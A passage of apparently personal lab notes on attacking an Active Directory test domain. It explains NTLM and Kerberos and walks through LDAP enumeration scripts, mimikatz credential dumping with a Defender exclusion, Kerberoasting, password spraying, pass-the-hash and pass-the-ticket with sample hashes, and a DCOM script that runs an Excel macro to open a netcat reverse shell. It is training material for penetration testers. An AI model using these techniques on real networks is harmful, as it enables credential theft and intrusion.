as a service account as opposed to an MSA.<br /><br />Creds-<br />Yee\Administrator (local admin DC):12qwaszx!@QWASZX<br />IIS (local admin IIS):12qwaszx!@QWASZX<br />yee\squid (domain user):yeetcannon<br />yee\tire (domain admin):adminyeetcannon<br />squid (kali):toortoor</div><div class='page'><h1 class='title level-4'>Nomenclature</h1><br/>LDAP - Used to access information in directory services (more specifically active directory in this scenario) over a network.<br /><br />LDAP name structure:<br />    LDAP://DC01.yee.wtf/DC=yee,DC=wtf<br />    hostname = &quot;DC01&quot;<br />    Domain Component (DC) = “yee.wtf”<br />    Distinguished Name = DC=&quot;yee,DC=wtf&quot;<br /><br /><a href=""><img src="images/1796-1.png" alt="images/1796-1.png" /></a><br /><br />object = Thing. Example:&quot;A user named Patrick&quot; of “A group named ‘Server Admins’”<br />objectclass = The charachteristics assigned to a type of object. Example:&quot;A user object type needs to have a ‘Display Name’ and can also have an address&quot;<br />objectclass attribute = The value of the charachteristics assigned to an object. Example:&quot;The objectclass attribute of ‘Display Name’ for Patrick is ‘P.Rothfus’&quot;<br /><br />UPN - User Principal Name - Used to Identify a user account. Example: “JGrisham@yee.wtf”<br /><br />SPN - Service Principle Name - Used to identify a service account (Like a UPN, but for a service and it associates a user account) - A mechanism used to provide specifc access to a an instance of a service on a machine. When a session ticket is presented to a SQL server the SPN needs to match that of the principal name of the SQL service. This exists to limit access to just the sql service as opposed to the entire SQL server. Example: “http/iis.yee.wtf tripp” http=service iis.yee.wtf=servername tripp=assosiated user<br /><br />MSA - Managed Service Account - An account with a long complex password, programatically changed periodically. MSA&#39;s are choice for accounts used to own/run SPN services. <br /><br />Lsass - Process that localy stores cached Windows creds.<br /><br />WDigest - Protocol used for clients to send cleartext credentials to HTTP and Simple Authentication Security Layer applications. Windows stores the password in memory for convenience of the user when they login to their workstation.<br /><br />Nonce - In cryptography, a nonce is an arbitrary number that can be used just once in a cryptographic communication. (Used in NTLM authentication)<br /><br />COM - Component Object Model - COM is an old Windows standard that enables interaction between programs. An example of a COM object would be a Word document with an Excel docement inside it that changes with the original Excel document. The more modern version of COM is .NET framework.<br /><br />DCOM - Distributed Component Object Model -  Unlike COM, DCOM is actually a protocol. DCOM is a subprotocol for MSRPC (port 135, Microsoft enhanced Remote Procedure Call) and is used to bridge the connection between software components and network components. Outlook over HTTP utilizes DCOM.<br /><br />Token - Each process on a windows machine has a token. The token describes the privileges of that process.<br /><br />Mandatory Integrity Control - A Process&#39;s Context Integrity - Defined as System, High, Medium, and Low. A process&#39;s context integrity defines its “trustworthyness,” which in turn determines what that process will have access to. For example IE by default will run in either a medium or high integrity context depending on how it is kicked off, but each tab will run in a low integrity process due to its low “trustworthyness.”<br /><br />What is the diﬀerence between a user account and a service account? - Nothing. Just how it is implemented.<br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Authentication Protocols</h1><br/></div><div class='page'><h1 class='title level-4'>NTLM</h1><br/></div><div class='page'><h1 class='title level-5'>When NTLM is used</h1><br/>1. NTLM authentication is used when a client authenticates to a server via IP address (instead of by hostname).<br />2. If the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server. <br />3. Third-party applications may choose to use NTLM authentication instead of Kerberos authentication. </div><div class='page'><h1 class='title level-5'>NTLM Function</h1><br/><a href=""><img src="images/1800-1.png" alt="images/1800-1.png" /></a><br /><br />1. From the users password the client caculates the NTLM hash. <br />2. The client sends its username to the application server it wants to authenticate to.<br />3. The application server sends a nonce to the client (Challenge).<br />4. The client sends back the nonce encrypted with its NTLM hash (Responce).<br />5. The application server sends the “Responce,” recieved from the client, username, and nonce to the Domain controler.<br />6. The domain controller, already having the NTLM hash for each username, encryptes the nonce with the NTLM hash of the assosiated username and compares that with the one recieved from the application server.<br />7. If the encrypted nonce&#39;s match, a message to approve authentication will be sent to the application server.</div><div class='page'><h1 class='title level-4'>Kerberos</h1><br/></div><div class='page'><h1 class='title level-5'>When is Kerberos used</h1><br/>Standard since Windows Server 2003.</div><div class='page'><h1 class='title level-5'>Kerberos Fucntion</h1><br/><a href=""><img src="images/1803-1.png" alt="images/1803-1.png" /></a><br /><br />Part 1. Login<br />1. A request is sent from client to the domian controller. <br />   a) The domain controller must have the role of key distribution center and authentication server service. <br />   b) This transaction is refred to as the Authentication Server Request (AS_REQ).<br />   c) The AS_REQ contains a time stamp that is encrypted using a hash derived from the password and username of the user.<br />2A. The domain contorler attempts to decrypt the time stamp with the user name and password in its database.<br />   a) If the time stamp is a duplicate, authentication will be unsucsessful (this is to mitigate replay attacks).<br />2B. The controller sends the sends the client an Authentication Server Reply (AS_REP).<br />    a) The AS_REP containsa a “Session Key” and a “Ticket Granting Ticket” (TGT).<br />    b) The session key is encrypted using the user&#39;s password hash and can be decrypted by the client and reused.<br />    c) The TGT contains information about the client.<br />        1. Group membership.<br />        2. Domain name.<br />        3. Time stamp.<br />        4. Client IP address.<br />        5. Session key.<br />    d) The TGT is encrypted by a secret only known to the KDC and cannot be decrypted by the client.<br />Part 2. Access resources in the domain<br />3. The client creates and sends a “Ticket Granting Service Request” (TGS_REQ) to the KDC (key distribution center/domain controller).<br />    a) The TGS_REQ contains, current user.<br />    b) Time stamp (encrypted using the session key).<br />    c) SPN of the resource.<br />    d) Encrypted TGT.<br />4a. The KDC recieves the TGS_REQ.<br />    a) The KDC checks if the SPN exists.<br />    b) The TGT is decrypted (using the secret key only known to the KDC).<br />    c) The session key is extracted from the TGT and is used to decrypt the username and timestamp of the request.<br />    d) The KDC performs several checks.<br />        1. The TGT timestamp must be valid.<br />        2. The username from the TGS_REQ must match the username from the TGT.<br />        3. The client IP address must match the TGT IP address<br />4b. If all checks are passed the Ticket Granting Service of the KDC responds to the client with a Ticket Granting Server Reply (TGS_REP).<br />    a) The TGS_REP contains the SPN granted access to.<br />    b) The Session Key to be used between the client and the SPN.<br />    c) A Servcie Ticket containing.<br />        1. The username.<br />        2. Group Memberships.<br />        3. The newly created session key.<br />        Note- The whole Service Ticket is encrypted with the password hash of the service account registered with the SPN to be authenticated to. The SPN and new Session key inside of the Service Ticket are encrypted with the session key of the clients TGT. <br />        The client now has a session key and a service ticket.<br />5. The client sends the application server an Application Request (AP_REQ).<br />    a) The AP_REQ includes.<br />    b) The username and timestamp encrypted with the Session Key for the Service Ticket.<br />    c) The Session Key.<br />    d) The Service Ticket.<br />6a. The application server recieves the AP_REQ.<br />    a) The Service Ticket is decrypted using the service accounts&#39; password hash extracting the username and Session key.<br />    b) That Session Key is then used to decrypt the username from the AP_REQ.<br />    c) If the AP_REQ username matches the one decrypted from the Service Ticket the request is accepted.<br />    d) The service inspects the group memberships in the Service Ticket.<br />    e) If the proper permissions are held, then access will be granted to the service.<br />    <br />    <br /></div><div class='page'><h1 class='title level-5'>Kerberos Funciton Summarized</h1><br/>Part 1- Login<br />1. Client Sends KDC a AS_REQ that has the time stamp encrypted with the users hash.<br />2. If the AS_REQ passes the checks, an AS_RES is sent to the client containing a Session Key and a TGT.<br />Part 2- Resource Access<br />3. The client sends a TGS_REQ to the KDC containing the desired SPN and the clients encrypted TGT.<br />4. If the TGS_REQ passes the checks, a TGS_REP is sent to the client containing a session key for that new session, a Service Ticket, and the desired SPN.<br />5. The client sends the application server an AP_REQ containing the username/timestamp encrypted with the Session Key, the Session Key, and the Service Ticket.<br />6. If the AP_REQ passes the checks, the client is permitted access to the service.</div><div class='page'><h1 class='title level-3'>LDAP Enumeration</h1><br/>This will be run on bossman from the user context of squid@yee</div><div class='page'><h1 class='title level-4'>Net.exe</h1><br/>net user<br />net user /domain<br /><a href=""><img src="images/1806-1.png" alt="images/1806-1.png" /></a><br />net user Tripp /domain<br /><a href=""><img src="images/1806-2.png" alt="images/1806-2.png" /></a><br />net group /domain<br /><a href=""><img src="images/1806-3.png" alt="images/1806-3.png" /></a><br />Note, that it appears as if there are nested groups we won&#39;t be able to tell due to net.exe&#39;s limitations.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Find and annotate who is in the domain users group.<br />2. Find and annotate who is in the domain admins group.<br /></div><div class='page'><h1 class='title level-4'>Powershell</h1><br/>These will all be run from Bossman (windows 10) from the context of the user squid.<br /><a href=""><img src="images/1808-1.png" alt="images/1808-1.png" /></a><br />Basic outline<br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(objectClass=Group)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;$obj}</div></div><br />find all users<br /><a href=""><img src="images/1808-2.png" alt="images/1808-2.png" /></a><br />find all users with cleaner output<br /><a href=""><img src="images/1808-3.png" alt="images/1808-3.png" /></a><br />find all groups<br /><a href=""><img src="images/1808-4.png" alt="images/1808-4.png" /></a><br />find nested groups<br /><a href=""><img src="images/1808-5.png" alt="images/1808-5.png" /></a><br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;(objectClass=Group)&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.properties.memberof&nbsp;-like&nbsp;$start_group){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;write-host&nbsp;$obj.properties.name&nbsp;&#39;is&nbsp;a&nbsp;member&nbsp;of&#39;&nbsp;$start_group}}<br />&nbsp;&nbsp;&nbsp;<br /></div></div><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Find What group is at the bottom of the nesting from the starting group marforcyber, and who the sole member is of that group.<br />2. Attempt to find who Kvothe&#39;s manager is.<br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>PowerView</h1><br/>Grants access to API&#39;s that are not easily utilized.<br />NetWkstaUserEnum- Can be leveraged to map out the domain as well as logged in users. Need Administrative coverage of each machine to return results (domain admin).<br />NetSessionEnum- Can be used to identify DC&#39;s and Share servers. Can be run from user context.<br /><br />Powerview has tons of capabilities.<br />Get-NetLoggedon takes advantage of the NetWkstaUserEnum API.<br />These were run from bossman under the context of a domain user and then a domain admin.<br /><a href=""><img src="images/1810-1.png" alt="images/1810-1.png" /></a><br /><a href=""><img src="images/1810-2.png" alt="images/1810-2.png" /></a><br /><br />Get-NetSession takes advantage of the NetSessionEnum API.<br /><a href=""><img src="images/1810-3.png" alt="images/1810-3.png" /></a><br /><a href=""><img src="images/1810-4.png" alt="images/1810-4.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. When running Get-Netsession under the context of squid, why can you not see that tire is logged in?</div><div class='page'><h1 class='title level-4'>Service Principal Names</h1><br/><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*http*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()&nbsp;<br />Foreach($obj&nbsp;in&nbsp;$Result){$obj}</div></div><br /><a href=""><img src="images/1812-1.png" alt="images/1812-1.png" /></a></div><div class='page'><h1 class='title level-5'>Exercise</h1><br/>1. Useing the homemade enumeration script, determine what other SPN&#39;s are in the environment.</div><div class='page'><h1 class='title level-3'>Cached Credentials Storage/Retrieval</h1><br/>User credentials are primarlily stored in Local Security Authority Subsystem Service (LSASS) memory space which runs as SYSTEM. <br />LSASS data structures are not publicly documented.<br />Mimikatz is the defacto standard for LSASS manipulation and can be implemented to bypass detection many ways.</div><div class='page'><h1 class='title level-4'>Logon Passwords</h1><br/>As well as this being an example of the default use of mimikatz, it is also an example of mimikatz bypassing windows defender, smart screen, and real time protection.<br /><br /><a href="https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/">https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/</a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1816-1.png" alt="images/1816-1.png" /></a><br />Crackstation.net shows that the NTLM hash of JBettis is “TheBus.”<br /><a href=""><img src="images/1816-2.png" alt="images/1816-2.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Tickets</h1><br/>In the realm of Kerberos authentication tickets come in the form of Ticket Granting Tickets (TGT) and Ticket Granting Service Tickets (TGS). <br />Remember! When a user completes a login (AS_REQ and then AS_REP) the AS_REP contains a TGT for that user. The user will then use that TGT to make a TGS request (TGS_REQ) when trying to authenticate with an application server.<br /><br />In summary, if you are able to steal a TGS of another user you can authenticate to only the specified service as them. With a TGT you can legitamitly go through the TGS_REQ, TGS_REP, AP_REQ, and AP_REP process and authenticate to any application service that the original TGT had access to. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br />In this example Add-MpPreference was used to exclude the &quot;C:\tools&quot; directory form Real Time Proteciton. Mimikatz was then downloaded from the kali webserver and ran.<br />Privilege::debug was used to run the commands under the context of the security privilige SEDebugPrivilige. This needs to be done becasue LSASS is running under the context of SYSTEM.<br /><a href=""><img src="images/1818-1.png" alt="images/1818-1.png" /></a><br />Note- The account you made a ticket for, must be authorized to reach a service that can be remotley administred otherwise it is not very useful. A microsoft SQL server would be the most obvious way to aquire RCE from here.</div><div class='page'><h1 class='title level-4'>WDigest</h1><br/>WDigest - Protocol used for clients to send cleartext credentials to HTTP and Simple Authentication Security Layer applications. Windows stores the password in memory (LSASS) for convenience of the user when they login to their workstation.<br />Optional Patch released in 2014. 2008R2/7 and before is vulnerable unless the optional patch and registry change was applied. <br /><br /><a href="https://www.hackingarticles.in/credential-dumping-wdigest/">https://www.hackingarticles.in/credential-dumping-wdigest/</a></div><div class='page'><h1 class='title level-5'>Demonstatation</h1><br/>This was run from Userbox (Windows 7) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1820-1.png" alt="images/1820-1.png" /></a><br /><br />This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1820-2.png" alt="images/1820-2.png" /></a><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>Kerberoast</h1><br/>What is Kerberoasting?<br />When a TGS_REQ is requested a TGS_RES is returned without authentication (The authentication (group access) is to be done by the application after the AP_REQ). The TGS_RES sent to the requesting computer is encoded with the hash of the password of the SPN owner. Brute forcing the TGS_RES can be done quickly and silently (done offline) leaving someone with the password for the SPN that shold not have it. Keep in mind that they will still need to be able to determine who the password belongs to and the SPN owner may not be obvious. <br /><br /><a href="https://www.blackhillsinfosec.com/a-toast-to-kerberoast/">https://www.blackhillsinfosec.com/a-toast-to-kerberoast/</a><br /></div><div class='page'><h1 class='title level-4'>Demonstration 1</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1822-1.png" alt="images/1822-1.png" /></a><br />Notice that the user is just a domain user and this is all being run from a non-elevated context.<br /><a href=""><img src="images/1822-2.png" alt="images/1822-2.png" /></a><br />After AS_REP it is expected that we would have a TGT. We see here that we also completed a AP_REP and were granted the ability to access the LDAP/DC01.yee.wtf/yee.wtf SPN (this is standard).<br /><a href=""><img src="images/1822-3.png" alt="images/1822-3.png" /></a><br />These commands are simply adding a non-default namespace and then requesting a ticket for the http/IIS.yee.wtf SPN. The key point here is that you do not need to be able to authenticate with the IIS server to do this. If you send the KDC a TGS_REQ for the ‘HTTP/IIS.yee.wtf’ SPN you will recieve a TGS_REP with a Service Ticket for the desired SPN. This Service Ticket is encrypted with the password for the SPN. If you can brute force it, you&#39;ve got the password.<br /><a href=""><img src="images/1822-4.png" alt="images/1822-4.png" /></a><br />We can see that we now have a Session Ticket for the HTTP SPN.<br /><a href=""><img src="images/1822-5.png" alt="images/1822-5.png" /></a><br />Dump the Tickets to disk.<br /><a href=""><img src="images/1822-6.png" alt="images/1822-6.png" /></a><br />Move the HTTP ticket to the kali box.<br />From here all we need to is crack the hash and BOOM, we&#39;ve got a password! This brute forcing is very fast.<br /><a href=""><img src="images/1822-7.png" alt="images/1822-7.png" /></a><br />Lastly we use our HomeMadeADEnum.ps1 script to see who the owner of the SPN is.<br /><div class="codebox"><div class="codebox">####Begin&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br />$DomainObj&nbsp;=&nbsp;[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br />$PDC&nbsp;=&nbsp;($DomainObj.PdcRoleOwner).Name<br />$SearchString&nbsp;=&nbsp;&quot;LDAP://&quot;<br />$SearchString&nbsp;+=&nbsp;$PDC&nbsp;+&nbsp;&quot;/&quot;<br />$DistinguishedName&nbsp;=&nbsp;&quot;DC=$($DomainObj.Name.Replace(&#39;.&#39;,&nbsp;&#39;,DC=&#39;))&quot;<br />$SearchString&nbsp;+=&nbsp;$DistinguishedName<br />$SearchString<br />####Finish&nbsp;Create&nbsp;Ldap&nbsp;Provider&nbsp;Path<br /><br />####Begin&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br />$Searcher&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)&nbsp;<br />$objDomain&nbsp;=&nbsp;New-Object&nbsp;System.DirectoryServices.DirectoryEntry&nbsp;<br />$Searcher.SearchRoot&nbsp;=&nbsp;$objDomain<br />####Finish&nbsp;Create&nbsp;Directory&nbsp;Searcher&nbsp;Object<br /><br />####Begin&nbsp;Create&nbsp;Filter<br />$Searcher.filter=&quot;serviceprincipalname=*&quot;<br />$Result&nbsp;=&nbsp;$Searcher.FindAll()<br />foreach&nbsp;($obj&nbsp;in&nbsp;$Result){<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($obj.Properties.serviceprincipalname&nbsp;-like&nbsp;&#39;*http/iis*&#39;){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;($value&nbsp;in&nbsp;$obj.Properties){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value}}}<br /><br /><br /><br /></div></div><br /><a href=""><img src="images/1822-8.png" alt="images/1822-8.png" /></a><br />Now we know the owner of the HTTP SPN is Tripp, his password is &quot;Passw0rd,&quot; and he is a member of the IIS_IUSRS group.<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Demonstration 2</h1><br/>Both of these enumerations were run from the kali machine against the whole domain. The first with zero authentication, the Second with the creds of a domain user.<br /><a href=""><img src="images/1823-1.png" alt="images/1823-1.png" /></a><br /><br /><a href=""><img src="images/1823-2.png" alt="images/1823-2.png" /></a><br />I then copy-pasted the ticket into krb5tgs.out and ran it against john, giving us the password Passw0rd.<br /><a href=""><img src="images/1823-3.png" alt="images/1823-3.png" /></a><br /></div><div class='page'><h1 class='title level-3'>Brute Force</h1><br/>There are about 65535 different tools to brute force things in active directory. The better ones will run some queries to determine what the account lockout numer is and how long you have until you can try again without locking the account.</div><div class='page'><h1 class='title level-4'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1825-1.png" alt="images/1825-1.png" /></a><br />Determined how fast we could spray with net accounts, and checked our known password against all accounts.<br />This could also be done with our HomeMadeEnum.ps1 script.</div><div class='page'><h1 class='title level-3'>Lateral Movment</h1><br/></div><div class='page'><h1 class='title level-4'>Pass the Hash</h1><br/>Pass the hash allows us to authenticate with the users via their NTLM hash. <br />This is method uses NTLM LEGITIMATLY. <br />Generally when passing the hash, in order to get a reverse shell the hash must belong to a domain admin or local admin because the account needs to be able to access the $Admin share.<br />For Pass the Hash to work, Windows File and Print Sharing needs to be enabled. <br />Pass the Hash uses the Service Control Manager API.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Tire (domain admin) in an elevated command prompt.<br /><a href=""><img src="images/1828-1.png" alt="images/1828-1.png" /></a><br /><a href=""><img src="images/1828-2.png" alt="images/1828-2.png" /></a></div><div class='page'><h1 class='title level-4'>Overpass the Hash</h1><br/>Overpass the Hash is similar to Pass the Hash as they both utilize a compromised NTLM hash, but in Overpass the Hash we will take that compromised NTLM hash and turn it into a TGT (or TGS). If our created TGT is that of a domain admin, it will give us the ability to send a TGS_REQ to the KDC that will return a TGS_RES containing a TGS that will allow us to authenticate to servers as that user. </div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in an elevated command prompt.<br />We have dumped Tire&#39;s hash several times now, but in case you don&#39;t have it : 4A75E2A7EE6E92ACBC02692028A4EECF<br />Utilizing overpass the hash (pth in mimikatz), create a session running as squid but will allow us to run commands as Tire.<br />First I am going to show that I am a user with the 3 standard tickets, plus one more becasue this is run in a users elevated command prompt. Note that I am denied when I try to psexec to the DC.<br /><a href=""><img src="images/1830-1.png" alt="images/1830-1.png" /></a><br /><a href=""><img src="images/1830-2.png" alt="images/1830-2.png" /></a><br /><br />I then used mimikatz to create a TGT with the NTLM hash of Tire and then kick off a cmd prompt.<br /><a href=""><img src="images/1830-3.png" alt="images/1830-3.png" /></a><br />In the new command prompt I showed that all of the previously cached tickets were gone (mimikatz-ism). What is really important about this is that just becasue we “successfully” created a TGT does not mean It will get me a TGS that will successfully authenticate to anything.<br />I then psexeced to the DC (which I was not able to do before).<br />After proving that I was on the DC I exited back to Bossman and checked my klist, noteing that there are cached tickets there now.<br /><a href=""><img src="images/1830-4.png" alt="images/1830-4.png" /></a><br /><a href=""><img src="images/1830-5.png" alt="images/1830-5.png" /></a><br />The NTLM hash was what we started with, and we ended with the TGT for a domain admin.<br /><br />Note- There was some minor hand of god that needed to be added to squids account to make this work. Not 100% as to why it was needed.<br /><a href=""><img src="images/1830-6.png" alt="images/1830-6.png" /></a></div><div class='page'><h1 class='title level-4'>Pass the Ticket</h1><br/>Pass the ticket is very similar to an Overpass the Hash technique, but instead of creating a TGT we are going to create a TGS.<br />Pass the ticket works because once a TGS is created and encrypted with the password “theoretically” only known to the KDC and itself it is trusted.<br /><br /><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Silver_Ticket_Walkthrough.html">https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Silver_Ticket_Walkthrough.html</a><br /></div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>This was run from Bossman (Windows 10) under the context of Squid (domain user) in a non-elevated command prompt.<br /><a href=""><img src="images/1832-1.png" alt="images/1832-1.png" /></a><br /><a href=""><img src="images/1832-2.png" alt="images/1832-2.png" /></a><br />From previous enumeration we determined that the owner of the IIS server is yee\tripp:Passw0rd. We are going to need to get the hash for that password.<br />A87F3A337D73085C45F9416BE5787D86<br /><a href=""><img src="images/1832-3.png" alt="images/1832-3.png" /></a><br /><br />The ticket is now running in memory. Becasue application request and service authentication (kerberos steps 5 and 6) do not involve the KDC, authentication to an application as an admin can be done! This is most commonly used against Microsoft SQL servers and can result in RCE.</div><div class='page'><h1 class='title level-4'>DCOM</h1><br/>Where COM is the standard that allows microsoft process&#39;s to talk to each other, DCOM is the same thing but for communication over the network.<br />Outlook, PowerPoint, and Excel have DCOM objects that allow lateral movment.<br />In summary:<br />Create an instance of the System.Activator class (which enables the ability to call the “Run” method via DCOM)<br />Make an Excel document and embed a macro that will run your shellcode.<br />Use the .NET command to move the file to the target machine.<br />Activate the “System” account by giving it a Desktop directory.<br />Useing the “Open” method and the “Workbooks” object we can run the Excel document.<br />Useing DCOM run the macro and catch the rev shell in a nc listener.</div><div class='page'><h1 class='title level-5'>Demonstration</h1><br/>Running as Tire from UserBox, we will make a macro calling nc.exe in an excel document, use DCOM to move the file to bossman and then execute the macro getting a reverse shell on the kali box.<br />Create a macro that when executed will give you a reverse shell.<br /><a href=""><img src="images/1834-1.png" alt="images/1834-1.png" /></a><br />Run this these commands/this script from userbox, pointing at Bossman.<br /><div class="codebox"><div class="codebox">$com&nbsp;=&nbsp;[activator]::CreateInstance([type]::GetTypeFromProgId(&quot;Excel.Application&quot;,&quot;192.168.40.129&quot;))<br /><br />$LocalPath&nbsp;=&nbsp;&quot;C:\Users\tire\Desktop\Macro.xlsm&quot;&nbsp;<br /><br />$RemotePath&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Macro.xlsm&quot;&nbsp;<br /><br />[System.IO.File]::Copy($LocalPath,&nbsp;$RemotePath,&nbsp;$True)&nbsp;<br /><br />$Path&nbsp;=&nbsp;&quot;\\192.168.40.129\c$\Windows\sysWOW64\config\systemprofile\Desktop&quot;&nbsp;<br /><br />$temp&nbsp;=&nbsp;[system.io.directory]::createDirectory($Path)&nbsp;<br /><br />$Workbook&nbsp;=&nbsp;$com.Workbooks.Open(&quot;C:\Macro.xlsm&quot;)<br /><br />$com.Run(&quot;Yeeter&quot;)</div></div><br /><br /><a href=""><img src="images/1834-2.png" alt="images/1834-2.png" /></a><br /><br /><a href=""><img src="images/1834-3.png" alt="images/1834-3.png" /></a><br /><br />Note- You may need to add a firewall rule depending on the networks GPO to create the COM object.<br />New-NetFirewallRule -DisplayName &quot;Allow DCOM&quot; -Direction Inbound -Action Allow -Enabled True -RemoteAddress 192.168.40.133<br />Remove-NetFirewallRule -DisplayName “Allow DCOM”</div><div class='page'><h1 class='title level-3'>Persistance</h1><br/></div><div class='page'><h1 